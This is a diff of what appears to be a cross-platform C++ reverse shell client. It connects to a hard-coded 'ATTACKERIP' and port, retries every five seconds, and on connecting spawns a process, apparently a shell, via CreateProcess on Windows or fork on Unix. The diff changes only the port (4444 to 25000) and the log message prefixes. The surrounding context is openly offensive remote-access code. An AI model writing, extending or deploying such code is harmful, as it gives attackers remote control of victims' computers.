@@ -19,7 +19,7 @@
 #endif
 
 const char* ATTACKERIP = "127.0.0.1";
-const int ATTACKERPORT = 4444;
+const int ATTACKERPORT = 25000;
 
 int main() {
 #if defined(_WIN32) || defined(WIN32)
@@ -35,7 +35,7 @@ int main() {
 #if defined(_WIN32) || defined(WIN32)
         SOCKETTYPE s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
         if (s == INVALID_SOCKET) {
-            std::cout << "server seems down. reconnecting..." << std::endl;
+            std::cout << "[!] server seems down. reconnecting..." << std::endl;
             SLEEP(5000);
             continue;
         }
@@ -47,12 +47,12 @@ int main() {
 
         if (WSAConnect(s, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
             CLOSESOCKET(s);
-            std::cout << "server seems down. reconnecting..." << std::endl;
+            std::cout << "[!] server seems down. reconnecting..." << std::endl;
             SLEEP(5000);
             continue;
         }
 
-        std::cout << "Connected to " << ATTACKERIP << ":" << ATTACKERPORT << std::endl;
+        std::cout << "[+] connected to " << ATTACKERIP << ":" << ATTACKERPORT << std::endl;
 
         STARTUPINFO si;
         PROCESS_INFORMATION pi;
@@ -74,7 +74,7 @@ int main() {
 #else
         int s = socket(AF_INET, SOCK_STREAM, 0);
         if (s < 0) {
-            std::cout << "server seems down. reconnecting..." << std::endl;
+            std::cout << "[!] server seems down. reconnecting..." << std::endl;
             SLEEP(5000);
             continue;
         }
@@ -86,12 +86,12 @@ int main() {
 
         if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
             CLOSESOCKET(s);
-            std::cout << "server seems down. reconnecting..." << std::endl;
+            std::cout << "[!] server seems down. reconnecting..." << std::endl;
             SLEEP(5000);
             continue;
         }
 
-        std::cout << "Connected to " << ATTACKERIP << ":" << ATTACKERPORT << std::endl;
+        std::cout << "[+] connected to " << ATTACKERIP << ":" << ATTACKERPORT << std::endl;
 
         pid_t pid = fork();
         if (pid == 0) {
@@ -107,7 +107,7 @@ int main() {
 
         CLOSESOCKET(s);
 #endif
-        std::cout << "server seems down. reconnecting..." << std::endl;
+        std::cout << "[!] server seems down. reconnecting..." << std::endl;
         SLEEP(5000);
     }
 
